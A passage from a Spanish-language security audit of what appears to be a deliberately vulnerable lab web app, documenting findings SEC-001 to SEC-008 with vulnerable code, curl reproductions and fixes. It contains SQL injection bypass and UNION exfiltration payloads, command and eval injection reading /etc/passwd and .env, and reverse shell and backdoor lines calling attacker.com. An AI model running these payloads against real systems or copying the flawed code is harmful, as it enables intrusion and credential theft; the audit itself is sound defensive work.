  console.log('Intento de login:', username, password); // passwords en logs (SEC-020)
  
  db.get(sql, (err, user) => {
    if (err) {
      return res.status(500).json({ error: err.message, sql }); // SQL expuesto (SEC-027)
    }
    if (!user) {
      return res.status(401).json({ error: 'El usuario no existe' }); // Enumeración (SEC-019)
    }
    if (user.password !== password) {
      return res.status(401).json({ error: 'Password incorrecto para usuario existente' }); // Enumeración (SEC-019)
    }
    
    const token = `token-${user.id}-${user.username}-${user.role}`; // Token falso (SEC-003)
    res.json({ token, user }); // Respuesta incluye password (SEC-023)
  });
});
```

### Reproducibilidad

**Escenario 1 — Bypass de autenticación total:**

```bash
curl -X POST http://localhost:4000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "'\'' OR '\''1'\''='\''1'\'' --", "password": "cualquiera"}'
```

La consulta resultante en SQLite es:
```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --'
-- La condición '1'='1' siempre es TRUE → devuelve el primer usuario de la tabla
-- El -- comenta el resto de la query (incluyendo la verificación de password)
```

**Escenario 2 — Login como usuario específico (admin) sin contraseña:**

```bash
curl -X POST http://localhost:4000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' --", "password": "ignorado"}'
```

Consulta resultante:
```sql
SELECT * FROM users WHERE username = 'admin' --'
-- Devuelve el usuario admin; la verificación de password en el código
-- sucede DESPUÉS de esta query → el atacante tiene el objeto user
```

**Escenario 3 — Extracción de datos con UNION (si hubiera más lógica):**

```sql
-- Payload: ' UNION SELECT id, username, password, role, email, username FROM users --
SELECT * FROM users WHERE username = '' 
UNION SELECT id, username, password, role, email, username FROM users --'
```

### Impacto Técnico

- **Bypass completo de autenticación:** Un atacante puede acceder a la aplicación como cualquier usuario, incluyendo administradores, sin conocer ninguna contraseña.
- **Exfiltración de datos:** Mediante UNION-based SQLi, se pueden extraer todos los datos de cualquier tabla de la base de datos.
- **Modificación de datos:** Con stacked queries (si el driver lo permite), se podrían ejecutar INSERT, UPDATE o DELETE.
- **Compromiso total de la base de datos:** La cuenta de SQLite tiene acceso completo a todas las tablas.

### Impacto de Negocio

- Acceso no autorizado a datos financieros de todos los clientes.
- Potencial exfiltración masiva de datos personales (GDPR/LOPD).
- Pérdida total de confidencialidad del sistema.
- Posibles implicaciones legales por incumplimiento de regulaciones de protección de datos.

### Causa Raíz

Construcción de consultas SQL mediante concatenación de strings sin usar consultas parametrizadas (prepared statements). Falta de validación y sanitización de entradas.

### Solución Recomendada

```javascript
// ✅ Implementación segura con prepared statements
router.post('/login', (req, res) => {
  const { username, password } = req.body;
  
  // Validación básica de entrada
  if (!username || !password || typeof username !== 'string') {
    return res.status(400).json({ error: 'Credenciales requeridas' });
  }
  
  // Consulta parametrizada — el driver escapa automáticamente
  const sql = "SELECT id, username, role FROM users WHERE username = ?";
  
  db.get(sql, [username], (err, user) => {
    if (err) {
      console.error('[login] Error de BD:', err.message); // log interno, no al cliente
      return res.status(500).json({ error: 'Error de autenticación' });
    }
    
    // Comparación con hash bcrypt (ver SEC-009)
    if (!user || !bcrypt.compareSync(password, user.passwordHash)) {
      // Mensaje genérico para evitar enumeración (ver SEC-019)
      return res.status(401).json({ error: 'Credenciales incorrectas' });
    }
    
    // Token JWT real (ver SEC-003, SEC-024)
    const token = jwt.sign(
      { id: user.id, username: user.username, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: '8h' }
    );
    
    // Solo devolver datos no sensibles
    res.json({ token, user: { id: user.id, username: user.username, role: user.role } });
  });
});
```

| Campo                       | Valor              |
|-----------------------------|--------------------|
| **Complejidad de Corrección** | Media            |
| **Prioridad**               | 🔴 Inmediata       |
| **Esfuerzo estimado**       | 4–6 horas          |

---

## SEC-002: Inyección SQL — Búsqueda de Clientes (UNION-based)

| Campo                      | Detalle                                                          |
|----------------------------|------------------------------------------------------------------|
| **Identificador**          | SEC-002                                                          |
| **Nombre**                 | Inyección SQL en Búsqueda — Exfiltración de Tabla de Usuarios   |
| **Categoría OWASP**        | A03:2021 – Injection                                             |
| **Tipo**                   | SQL Injection — UNION-based (exfiltración de datos)             |
| **Severidad**              | 🔴 Crítica                                                       |
| **CVSS v3.1**              | 9.1 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)                       |
| **Herramienta detectora**  | OWASP ZAP + Revisión Manual                                      |
| **CWE**                    | CWE-89: SQL Injection                                            |

### Descripción Técnica

El endpoint `GET /api/clients/search` acepta un parámetro `q` (query de búsqueda) que es insertado directamente en una consulta SQL `LIKE` sin parametrización. Esto permite ejecutar un ataque de **UNION-based SQL Injection** para extraer datos de cualquier tabla de la base de datos, incluyendo la tabla `users` con todas las contraseñas en texto plano.

### Evidencia — `backend/src/controllers/clientController.js`: función `searchClients`

```javascript
function searchClients(req, res) {
  const q = req.query.q; // Input del usuario sin validar
  
  // VULNERABILIDAD: operador LIKE con concatenación directa
  const sql = "SELECT * FROM clients WHERE name LIKE '%" + q + "%'";
  //                                                    ^
  //                          Cierra el LIKE e inyecta SQL adicional
  
  db.all(sql, (err, rows) => {
    if (err) {
      return res.status(500).json({ error: err.message, sql }); // SQL expuesto
    }
    res.json(rows);
  });
}
```

### Reproducibilidad

**Payload de exfiltración de usuarios:**

```bash
# URL-encode del payload: %' UNION SELECT id,username,password,role,email,fullName FROM users --
curl "http://localhost:4000/api/clients/search?q=%25'%20UNION%20SELECT%20id,username,password,role,email,fullName%20FROM%20users%20--"
```

La consulta construida en el servidor:
```sql
SELECT * FROM clients WHERE name LIKE '%%' 
UNION SELECT id, username, password, role, email, fullName FROM users --%'
```

**Respuesta obtenida (ejemplo):**
```json
[
  { "id": 1, "name": "admin",    "amount": "admin123",  "overdue": "admin",   ... },
  { "id": 2, "name": "jperez",   "amount": "pass456",   "overdue": "user",    ... },
  { "id": 3, "name": "mgarcia",  "amount": "secret789", "overdue": "manager", ... }
]
```

Los campos de la tabla `clients` reciben los datos de `users`, exponiendo **todos los usuarios con sus contraseñas en texto plano y roles**.

### Impacto Técnico

- Exfiltración completa de credenciales de todos los usuarios del sistema.
- Posibilidad de pivotar hacia otros ataques con las credenciales obtenidas.
- Acceso potencial a información personal de clientes (datos financieros, facturas).
- Modificación de datos si se utilizan payloads de escritura.

### Impacto de Negocio

- Violación masiva de datos de clientes — posible incumplimiento del RGPD/LOPD.
- Compromiso de todas las cuentas de usuarios del sistema.
- Daño reputacional severo en caso de divulgación pública.

### Causa Raíz

Idéntica a SEC-001: construcción de SQL por concatenación de strings.

### Solución Recomendada

```javascript
function searchClients(req, res) {
  const q = req.query.q;
  
  if (!q || typeof q !== 'string' || q.length < 2) {
    return res.status(400).json({ error: 'Búsqueda debe tener al menos 2 caracteres' });
  }
  
  // Limitar longitud del input
  const sanitizedQ = q.substring(0, 100);
  
  // Consulta parametrizada con LIKE
  const sql = "SELECT id, name, email, active FROM clients WHERE name LIKE ?";
  db.all(sql, [`%${sanitizedQ}%`], (err, rows) => {
    if (err) {
      console.error('[searchClients] Error:', err.message);
      return res.status(500).json({ error: 'Error en búsqueda' });
    }
    res.json(rows);
  });
}
```

| Campo                       | Valor              |
|-----------------------------|--------------------|
| **Complejidad de Corrección** | Media            |
| **Prioridad**               | 🔴 Inmediata       |
| **Esfuerzo estimado**       | 2–4 horas          |

---

## SEC-003: Autenticación Rota — Token de Sesión Falsificable

| Campo                      | Detalle                                                          |
|----------------------------|------------------------------------------------------------------|
| **Identificador**          | SEC-003                                                          |
| **Nombre**                 | Autenticación Rota — Token sin Firma Criptográfica               |
| **Categoría OWASP**        | A07:2021 – Identification and Authentication Failures            |
| **Tipo**                   | Broken Authentication — Predictable / Forgeable Token            |
| **Severidad**              | 🔴 Crítica                                                       |
| **CVSS v3.1**              | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)                       |
| **Herramienta detectora**  | Revisión Manual + Prueba de Concepto                             |
| **CWE**                    | CWE-330: Use of Insufficiently Random Values / CWE-345: Insufficient Verification of Data Authenticity |

### Descripción Técnica

El sistema de autenticación de CarteraPro Risk Lab utiliza un esquema de token de sesión **completamente inseguro y falsificable**. En lugar de usar JWT con firma criptográfica (pese a tener `jsonwebtoken` como dependencia), el token se construye como una simple concatenación de texto plano: `token-{id}-{username}-{role}`. Cualquier persona puede construir un token válido para cualquier usuario, incluyendo administradores, sin necesidad de autenticarse.

### Evidencia — `backend/src/controllers/authController.js`

```javascript
// Generación del token — completamente inseguro
const token = `token-${user.id}-${user.username}-${user.role}`;
// Ejemplo de token generado: "token-1-admin-admin"
// Este token NO tiene:
// - Firma criptográfica
// - Fecha de expiración
// - Verificación de integridad
```

**`backend/src/middleware/auth.js`:**

```javascript
function weakAuth(req, res, next) {
  const authHeader = req.headers['authorization'];
  
  if (authHeader) {
    // "Verificación": solo comprueba que el string empieza por "token-"
    // No verifica firma, no verifica que el usuario existe en BD,
    // no verifica el rol, no verifica expiración
    if (authHeader.startsWith('token-')) {
      // Parsea el token para extraer id, username y role
      const parts = authHeader.split('-');
      req.user = {
        id: parts[1],
        username: parts[2],
        role: parts[3]
      };
    }
  }
  
  // SIEMPRE llama a next() — incluso si no hay token o el formato es incorrecto
  next();
}
```

### Reproducibilidad

**Escenario — Acceso como admin sin credenciales:**

```bash
# Token fabricado para el usuario admin (sin autenticarse)
curl http://localhost:4000/api/admin/panel \
  -H "Authorization: token-1-admin-admin"

# Respuesta: datos completos del panel de administración
# El servidor acepta cualquier token con formato "token-N-usuario-rol"
```

**Escenario — Suplantación de cualquier usuario:**

```bash
# Acceder como cualquier usuario conocido
curl http://localhost:4000/api/clients \
  -H "Authorization: token-99-cualquier_usuario-admin"
# Funciona — el servidor extrae el rol 'admin' del string y lo acepta
```

### Impacto Técnico

- Cualquier atacante puede autenticarse como administrador sin conocer ninguna contraseña.
- El mecanismo de autenticación es **completamente inefectivo**.
- Incluso si existiera autorización basada en roles, sería trivialmente bypasseable.
- Combinado con SEC-006 (weakAuth siempre llama next()), la protección es nula.

### Impacto de Negocio

- Acceso no autorizado total a todas las funciones del sistema.
- Compromiso completo de la confidencialidad e integridad de los datos.
- Incumplimiento de cualquier estándar de seguridad (ISO 27001, PCI-DSS, etc.).

### Causa Raíz

Implementación artesanal de un mecanismo de autenticación sin conocimiento de los estándares de la industria. La dependencia `jsonwebtoken` está instalada pero no se utiliza correctamente.

### Solución Recomendada

```javascript
const jwt = require('jsonwebtoken');

// Generación correcta de JWT:
const token = jwt.sign(
  { id: user.id, username: user.username, role: user.role },
  process.env.JWT_SECRET, // secreto fuerte (>= 256 bits)
  { expiresIn: '8h', issuer: 'carterapro-api' }
);

// Verificación correcta en middleware:
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // "Bearer <token>"
  
  if (!token) {
    return res.status(401).json({ error: 'Token de autenticación requerido' });
  }
  
  jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
    if (err) {
      return res.status(403).json({ error: 'Token inválido o expirado' });
    }
    req.user = decoded;
    next();
  });
}
```

| Campo                       | Valor              |
|-----------------------------|--------------------|
| **Complejidad de Corrección** | Media            |
| **Prioridad**               | 🔴 Inmediata       |
| **Esfuerzo estimado**       | 4–8 horas          |

---

## SEC-004: Ejecución Remota de Comandos del Sistema (RCE via exec)

| Campo                      | Detalle                                                               |
|----------------------------|-----------------------------------------------------------------------|
| **Identificador**          | SEC-004                                                               |
| **Nombre**                 | Remote Code Execution — Inyección de Comandos del Sistema Operativo   |
| **Categoría OWASP**        | A03:2021 – Injection                                                  |
| **Tipo**                   | OS Command Injection / RCE                                            |
| **Severidad**              | 🔴 Crítica                                                            |
| **CVSS v3.1**              | 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)                           |
| **Herramienta detectora**  | SonarQube + OWASP ZAP + Revisión Manual                               |
| **CWE**                    | CWE-78: Improper Neutralization of Special Elements in OS Command      |

### Descripción Técnica

El endpoint `GET /api/admin/lab/cmd` acepta el parámetro `cmd` desde la query string y lo pasa **directamente** a la función `exec` del módulo `child_process` de Node.js sin ninguna validación, sanitización o lista de comandos permitidos. Esto permite a cualquier usuario (autenticado o no, dado que la autenticación está rota) ejecutar **comandos arbitrarios del sistema operativo** en el servidor con los privilegios del proceso Node.js.

### Evidencia — `backend/src/controllers/adminController.js`, línea ~99

```javascript
const { exec } = require('child_process');

function commandInjection(req, res) {
  const cmd = req.query.cmd; // Input del atacante — sin validación alguna
  
  // VULNERABILIDAD CRÍTICA: ejecución directa del comando del atacante
  exec(cmd, { timeout: 7000 }, (error, stdout, stderr) => {
    res.json({
      cmd,          // el comando ejecutado también se devuelve
      stdout,       // salida estándar del comando
      stderr,       // salida de error
      error: error ? error.message : null
    });
  });
}
```

### Reproducibilidad

**Lectura de archivos del sistema:**

```bash
curl "http://localhost:4000/api/admin/lab/cmd?cmd=cat%20/etc/passwd"
# Respuesta: contenido completo de /etc/passwd
```

**Enumeración del sistema:**

```bash
curl "http://localhost:4000/api/admin/lab/cmd?cmd=id%3Buname%20-a%3Bifconfig"
# Respuesta: usuario actual, kernel, interfaces de red
```

**Exfiltración de secretos:**

```bash
curl "http://localhost:4000/api/admin/lab/cmd?cmd=cat%20.env"
curl "http://localhost:4000/api/admin/lab/cmd?cmd=cat%20backend/.env"
# Respuesta: todas las variables de entorno del archivo .env
```

**Reverse shell (compromiso total del servidor):**

```bash
# Payload: bash -i >& /dev/tcp/attacker.com/4444 0>&1
curl "http://localhost:4000/api/admin/lab/cmd?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker.com%2F4444%200%3E%261"
# Resultado: conexión de shell inversa al servidor del atacante
```

### Impacto Técnico

- **Compromiso total del servidor:** El atacante puede ejecutar cualquier comando con los privilegios del proceso Node.js.
- **Acceso a todos los archivos:** Lectura de `.env`, claves privadas, certificados, base de datos.
- **Movimiento lateral:** Desde el servidor comprometido, pivotar hacia otros sistemas en la red interna.
- **Persistencia:** Instalación de backdoors, modificación de cron jobs, creación de usuarios.
- **Destrucción de datos:** `rm -rf` sobre el directorio de la aplicación.

### Impacto de Negocio

- Compromiso total e irreversible del servidor si se explota.
- Pérdida potencial de todos los datos.
- Posible punto de entrada a la red corporativa completa.
- Incumplimiento grave de cualquier normativa de seguridad.

### Causa Raíz

Diseño explícito como endpoint de laboratorio de vulnerabilidades, sin protección adecuada para el contexto de despliegue. En un entorno de producción, este tipo de endpoint nunca debería existir.

### Solución Recomendada

**En producción:** Eliminar completamente este endpoint. No existe justificación legítima para exponer `exec` con input de usuario.

```javascript
// Si se necesita ejecutar comandos específicos, usar una lista blanca estricta:
const ALLOWED_COMMANDS = {
  'status': 'systemctl status node-app --no-pager',
  'disk': 'df -h /var/app',
  'memory': 'free -m'
};

function safeCommandExec(req, res) {
  const cmdKey = req.query.cmd;
  
  if (!ALLOWED_COMMANDS[cmdKey]) {
    return res.status(400).json({ error: 'Comando no permitido' });
  }
  
  exec(ALLOWED_COMMANDS[cmdKey], { timeout: 5000 }, (error, stdout) => {
    if (error) return res.status(500).json({ error: 'Error al ejecutar comando' });
    res.json({ output: stdout });
  });
}
```

| Campo                       | Valor              |
|-----------------------------|--------------------|
| **Complejidad de Corrección** | Muy Baja (eliminar el endpoint) |
| **Prioridad**               | 🔴 Inmediata       |
| **Esfuerzo estimado**       | < 30 minutos       |

---

## SEC-005: Ejecución Remota de Código via `eval()` (RCE)

| Campo                      | Detalle                                                              |
|----------------------------|----------------------------------------------------------------------|
| **Identificador**          | SEC-005                                                              |
| **Nombre**                 | Remote Code Execution via eval() — Evaluación de Código Arbitrario  |
| **Categoría OWASP**        | A03:2021 – Injection                                                 |
| **Tipo**                   | Remote Code Execution — eval-based                                   |
| **Severidad**              | 🔴 Crítica                                                           |
| **CVSS v3.1**              | 10.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)                          |
| **Herramienta detectora**  | SonarQube (regla: `javascript:S1523`) + Revisión Manual              |
| **CWE**                    | CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code |

### Descripción Técnica

El endpoint `GET /api/admin/lab/eval` toma el parámetro `code` de la query string y lo pasa directamente a la función `eval()` de JavaScript. Dado que `eval` ejecuta código JavaScript arbitrario en el contexto del proceso Node.js, esto constituye un vector de **ejecución remota de código** con acceso completo a todos los módulos del servidor, el sistema de archivos y la red.

### Evidencia — `backend/src/controllers/adminController.js`

```javascript
function remoteEval(req, res) {
  const code = req.query.code; // Código JavaScript arbitrario del atacante
  
  try {
    // VULNERABILIDAD CRÍTICA: eval de código controlado por el atacante
    const result = eval(code);
    //             ^^^^^^^^^^^
    //    Ejecuta CUALQUIER código JavaScript en el contexto del servidor
    
    res.json({ result: String(result), code });
  } catch (e) {
    res.json({ error: e.message, code });
  }
}
```

### Reproducibilidad

**Lectura de archivos (equivalente a LFI):**

```bash
curl "http://localhost:4000/api/admin/lab/eval?code=require('fs').readFileSync('.env','utf8')"
# Respuesta: contenido completo del archivo .env
```

**Ejecución de comandos del sistema:**

```bash
curl "http://localhost:4000/api/admin/lab/eval?code=require('child_process').execSync('id').toString()"
# Respuesta: {"result": "uid=1000(node) gid=1000(node) groups=1000(node)"}
```

**Exfiltración de variables de entorno:**

```bash
curl "http://localhost:4000/api/admin/lab/eval?code=JSON.stringify(process.env)"
# Respuesta: todas las variables de entorno en JSON
```

**Creación de backdoor persistente:**

```bash
curl "http://localhost:4000/api/admin/lab/eval?code=require('fs').writeFileSync('/tmp/backdoor.sh','#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1')"
```

### Impacto Técnico

Equivalente o superior a SEC-004 (RCE via exec). `eval` tiene acceso directo a todas las variables globales de Node.js (`process`, `require`, `__dirname`, etc.) sin necesidad de inyectar operadores de shell como `;` o `&&`.

### Impacto de Negocio

Idéntico a SEC-004: compromiso total del servidor.

### Causa Raíz

Uso explícito de `eval` con input de usuario. SonarQube marca `eval()` como vulnerabilidad de seguridad crítica (Blocker) en cualquier contexto.

### Solución Recomendada

**Eliminar completamente** el endpoint. No existe ningún caso de uso legítimo para `eval` con input de usuario externo. Si se necesita un motor de scripting controlado, usar sandboxes como `vm2` con restricciones estrictas (aunque incluso `vm2` ha tenido escapadas de sandbox).

| Campo                       | Valor              |
|-----------------------------|--------------------|
| **Complejidad de Corrección** | Muy Baja (eliminar el endpoint) |
| **Prioridad**               | 🔴 Inmediata       |
| **Esfuerzo estimado**       | < 30 minutos       |

---

## SEC-006: Control de Acceso Completamente Inexistente

| Campo                      | Detalle                                                           |
|----------------------------|-------------------------------------------------------------------|
| **Identificador**          | SEC-006                                                           |
| **Nombre**                 | Broken Access Control — Middleware de Autenticación No Funcional  |
| **Categoría OWASP**        | A01:2021 – Broken Access Control                                  |
| **Tipo**                   | Missing Authentication + Missing Authorization                    |
| **Severidad**              | 🔴 Crítica                                                        |
| **CVSS v3.1**              | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)                        |
| **Herramienta detectora**  | Revisión Manual + OWASP ZAP                                       |
| **CWE**                    | CWE-306: Missing Authentication for Critical Function / CWE-862: Missing Authorization |

### Descripción Técnica

El middleware de autenticación `weakAuth` en `backend/src/middleware/auth.js` **siempre llama a `next()`** sin realizar ninguna verificación. Independientemente de si el cliente envía un token válido, un token inválido, o ningún token, el middleware permite el paso. Esto significa que **todos los endpoints del backend son accesibles sin ninguna autenticación**, incluyendo los endpoints de administración más críticos (RCE, SSRF, LFI, debug de variables de entorno).

### Evidencia — `backend/src/middleware/auth.js`

```javascript
function weakAuth(req, res, next) {
  const authHeader = req.headers['authorization'];
  
  // Intenta parsear el token si existe, pero...
  if (authHeader && authHeader.startsWith('token-')) {
    const parts = authHeader.split('-');
    req.user = {
      id: parts[1],
      username: parts[2],
      role: parts[3]
    };
  }
  
  // VULNERABILIDAD CRÍTICA: next() se llama SIEMPRE
  // Sin importar si hay token, si es válido, si el usuario existe
  // Si no hay token → req.user es undefined → next() de todas formas
  next(); // ← NUNCA devuelve 401/403
}

// El middleware frontendOnlyAdminHint (para rutas de admin) es igual:
function frontendOnlyAdminHint(req, res, next) {
  // COMPLETAMENTE VACÍO — ni siquiera intenta verificar rol de admin
  next();
}
```

### Reproducibilidad

**Acceso a panel de admin sin token:**

```bash
curl http://localhost:4000/api/admin/panel
# Respuesta 200: datos completos del panel de administración
```

**Acceso a debug (process.env) sin token:**

```bash
curl http://localhost:4000/api/admin/debug
# Respuesta 200: todas las variables de entorno del proceso
```

**Acceso a RCE sin token:**

```bash
curl "http://localhost:4000/api/admin/lab/cmd?cmd=id"
# Respuesta 200: {"stdout": "uid=1000(node)..."}
```

**Acceso a todos los usuarios con contraseñas:**

```bash
curl http://localhost:4000/api/auth/users
# Respuesta 200: lista completa de usuarios con passwords en texto plano
```

### Impacto Técnico

- **Zero authentication barrier:** Cualquier petición HTTP al servidor es procesada sin verificación de identidad.
- Todos los hallazgos de seguridad (SEC-004, SEC-005, SEC-007, SEC-008, etc.) son explotables por cualquier usuario anónimo en la red.
- Las vulnerabilidades individuales se amplifican exponencialmente al no requerir autenticación previa.

### Impacto de Negocio

- Riesgo extremo de compromiso total del sistema por cualquier actor en la red.
- Incumplimiento de cualquier estándar de seguridad básico.
- En un entorno de producción expuesto a Internet: compromiso inminente.

### Causa Raíz

Implementación intencional de un middleware de laboratorio diseñado para demostrar vulnerabilidades. La función fue nombrada `weakAuth` intencionalmente, pero su comportamiento no está documentado como un riesgo para potenciales despliegues inadvertidos.

### Solución Recomendada

Ver SEC-003 para la implementación correcta del middleware de autenticación JWT. Adicionalmente, implementar middleware de autorización por rol:

```javascript
// Middleware de verificación de rol admin
function requireAdmin(req, res, next) {
  if (!req.user) {
    return res.status(401).json({ error: 'Autenticación requerida' });
  }
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Acceso restringido a administradores' });
  }
  next();
}

// Aplicar en las rutas de admin:
router.get('/panel', authenticateToken, requireAdmin, panel);
router.get('/debug', authenticateToken, requireAdmin, debug);
// ELIMINAR los endpoints /lab/cmd, /lab/eval en producción
```

| Campo                       | Valor              |
|-----------------------------|--------------------|
| **Complejidad de Corrección** | Media            |
| **Prioridad**               | 🔴 Inmediata       |
| **Esfuerzo estimado**       | 4–8 horas          |

---

## SEC-007: Credenciales Hardcodeadas en Código Fuente

| Campo                      | Detalle                                                         |
|----------------------------|-----------------------------------------------------------------|
| **Identificador**          | SEC-007                                                         |
| **Nombre**                 | Credenciales y Secretos Hardcodeados en Repositorio             |
| **Categoría OWASP**        | A02:2021 – Cryptographic Failures                               |
| **Tipo**                   | Sensitive Data Exposure — Hardcoded Credentials                 |
| **Severidad**              | 🔴 Crítica                                                      |
| **CVSS v3.1**              | 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)                      |
| **Herramienta detectora**  | SonarQube (regla: `javascript:S2068`) + Revisión Manual         |
| **CWE**                    | CWE-798: Use of Hard-coded Credentials                          |

### Descripción Técnica

Se identificaron múltiples credenciales, claves de API, secretos criptográficos y contraseñas hardcodeadas directamente en el código fuente de la aplicación y en archivos de configuración versionados. Cualquier persona con acceso al repositorio de código tiene acceso inmediato a estos secretos, incluyendo potenciales atacantes que obtengan acceso al repositorio (por fuga, repositorio público accidental, etc.).

### Evidencia — `backend/src/controllers/legacyDebtController.js`

```javascript
// ======================================================
// SECRETOS HARDCODEADOS EN CÓDIGO FUENTE
// ======================================================

// Claves de acceso AWS (acceso completo a servicios cloud)
const AWS_ACCESS_KEY = 'AKIA[REDACTED-FAKE-AWS-KEY]';
const AWS_SECRET_KEY = '[REDACTED-FAKE-AWS-SECRET-KEY]';

// Clave privada RSA expuesta en código
const PRIVATE_KEY = `-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA0Z3VS5JJcds3xHn/ygWep4PAtEsHAQPHSC2KBHPVCbGFYqRU
...
-----END RSA PRIVATE KEY-----`;

// Contraseña maestra de base de datos
const DB_MASTER_PASSWORD = 'SuperSecret@2024!';

// Número de tarjeta de crédito (PCI-DSS violation)
const TEST_CARD_NUMBER = '4111111111111111';
const TEST_CARD_CVV = '123';
```

### Evidencia — `frontend/src/utils/sonarDebt.js`

```javascript
// Secreto de API frontend expuesto en bundle JS (accesible por cualquier usuario)
const FRONTEND_API_SECRET = 'sk_live_[REDACTED]';

// Clave de Google Maps (generará costos al ser usada por terceros)
const GOOGLE_MAPS_KEY = 'AIzaSyBXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX';

// JWT hardcodeado — si el secreto se usa en producción, los tokens son forjables
const HARDCODED_JWT = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';
```

### Evidencia — `docker-compose.yml`

```yaml
environment:
  - JWT_SECRET=mi_secreto_super_seguro_carterapro_2024
  - ADMIN_PASSWORD=Admin@CarteraPro2024!
  - DB_ENCRYPTION_KEY=carterapro_enc_key_32chars_long!!
```

### Evidencia — `sonar-project.properties`

```properties
# Token de SonarQube expuesto en archivo de configuración versionado
sonar.login=sqp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

### Impacto Técnico

- Las claves AWS expuestas permiten acceso completo a los servicios cloud de la organización.
- La clave privada RSA expuesta compromete todos los certificados y tokens firmados con ella.
- Los secretos en el bundle JS del frontend son accesibles por cualquier usuario que inspeccione el código JavaScript del navegador.
- Los tokens de SonarQube permiten acceso al análisis de código interno.

### Impacto de Negocio

- Potencial de costos económicos masivos por uso no autorizado de servicios AWS/Google Cloud.
- Violación de PCI-DSS al incluir números de tarjetas en código.
- Compromiso criptográfico de todos los sistemas que usan las claves expuestas.
- Una vez en el historial de git, los secretos permanecen accesibles incluso si se eliminan del código actual.

### Causa Raíz

Falta de políticas de gestión de secretos. Los secretos se colocaron en el código durante el desarrollo y nunca fueron migrados a un gestor de secretos o variables de entorno externas.

### Solución Recomendada

1. **Rotar todos los secretos expuestos inmediatamente** (claves AWS, tokens API, contraseñas).
2. **Usar variables de entorno** para todos los secretos, nunca hardcodearlos.
3. **Implementar un gestor de secretos** (HashiCorp Vault, AWS Secrets Manager, Azure Key Vault).
4. **Agregar `.env` al `.gitignore`** y usar `.env.example` con valores de ejemplo sin secretos reales.
5. **Configurar un pre-commit hook** con herramientas como `truffleHog` o `detect-secrets` para prevenir commits de secretos.

```bash
# Rotar claves AWS inmediatamente:
aws iam delete-access-key --access-key-id AKIA[REDACTED-FAKE-AWS-KEY]

# Limpiar historial de git (requiere reescritura del historial):
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch backend/src/controllers/legacyDebtController.js" \
  --prune-empty --tag-name-filter cat -- --all
```

| Campo                       | Valor              |
|-----------------------------|--------------------|
| **Complejidad de Corrección** | Media            |
| **Prioridad**               | 🔴 Inmediata       |
| **Esfuerzo estimado**       | 8–16 horas (rotación + refactorización) |

---

## SEC-008: Exposición Completa de Variables de Entorno

| Campo                      | Detalle                                                              |
|----------------------------|----------------------------------------------------------------------|
| **Identificador**          | SEC-008                                                              |
| **Nombre**                 | Exposición de process.env en Endpoint Público                        |
| **Categoría OWASP**        | A05:2021 – Security Misconfiguration                                 |
| **Tipo**                   | Sensitive Data Exposure — Environment Variables Disclosure           |
| **Severidad**              | 🔴 Crítica                                                           |
| **CVSS v3.1**              | 9.1 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)                           |
| **Herramienta detectora**  | OWASP ZAP + Revisión Manual                                          |
| **CWE**                    | CWE-497: Exposure of Sensitive System Information to Unauthorized Control Sphere |

### Descripción Técnica

El endpoint `GET /api/admin/debug` devuelve el objeto completo `process.env` de Node.js como respuesta JSON. Este objeto contiene **todas las variables de entorno** del proceso, incluyendo secretos, claves de API, contraseñas de bases de datos, tokens JWT, configuraciones internas y cualquier otro secreto cargado desde el archivo `.env` o definido en el sistema. El endpoint no requiere autenticación (SEC-006).

### Evidencia — `backend/src/controllers/adminController.js`: función `debug`

```javascript
function debug(req, res) {
  // VULNERABILIDAD CRÍTICA: exposición total del entorno del proceso
  res.json({
    env: process.env,           // TODAS las variables de entorno
    cwd: process.cwd(),         // Directorio de trabajo actual
    pid: process.pid,           // PID del proceso
    uptime: process.uptime(),   // Tiempo de ejecución
    memoryUsage: process.memoryUsage(), // Uso de memoria
    versions: process.versions, // Versiones de Node.js y dependencias
    platform: process.platform  // Sistema operativo
  });
}
```

### Reproducibilidad

```bash
curl http://localhost:4000/api/admin/debug
```

Respuesta típica (sin autenticación):
```json
{
  "env": {
    "JWT_SECRET": "mi_secreto_super_seguro_carterapro_2024",
    "ADMIN_PASSWORD": "Admin@CarteraPro2024!",
    "DB_PATH": "/app/backend/cartera.sqlite",
    "DB_ENCRYPTION_KEY": "carterapro_enc_key_32chars_long!!",
    "NODE_ENV": "development",
    "PORT": "4000",
    "PATH": "/usr/local/sbin:/usr/local/bin:...",
    "HOME": "/home/node",
    ...
  },
  "cwd": "/app/backend",
  "pid": 1234,
  "versions": { "node": "18.17.0", "v8": "10.2.154.26", ... }
}
```

### Impacto Técnico

- **Exposición de todos los secretos de la aplicación** en una sola petición sin autenticación.
- Un atacante obtiene el `JWT_SECRET` para forjar tokens JWT válidos.
- Obtiene credenciales de bases de datos, claves de cifrado y tokens de terceros.
- La ruta del directorio de trabajo facilita ataques de path traversal (SEC-013).

### Impacto de Negocio

- Compromiso inmediato de todos los sistemas integrados con las claves expuestas.
- Pérdida total de secretos que pueden requerir rotación costosa y urgente.

### Causa Raíz

Endpoint de diagnóstico de desarrollo sin protección, dejado activo en el código base.

### Solución Recomendada

Eliminar el endpoint de debug completamente en producción. Si es necesario para diagnóstico, protegerlo con autenticación de administrador y devolver solo información no sensible:

```javascript
